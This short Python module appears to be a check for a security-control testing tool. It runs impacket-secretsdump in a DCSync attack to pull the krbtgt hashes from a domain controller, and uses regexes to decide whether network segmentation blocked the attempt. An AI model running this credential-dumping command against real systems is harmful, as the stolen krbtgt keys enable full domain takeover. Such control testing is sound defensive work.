"""DCSync via impacket-secretsdump. Tests segmentation (RPC replication)."""
META = {
    "id": "dcsync",
    "name": "DCSync",
    "category": "AD Exploitation",
    "control": "Segmentation (RPC replication)",
    "fix": "SD-WAN",
    "success_regex": r"aad3b435|:::|krbtgt:|Kerberos keys grabbed",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno|STATUS_",
}

def run(target, ctx):
    return ctx.run_cmd(
        "impacket-secretsdump {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt",
        target)
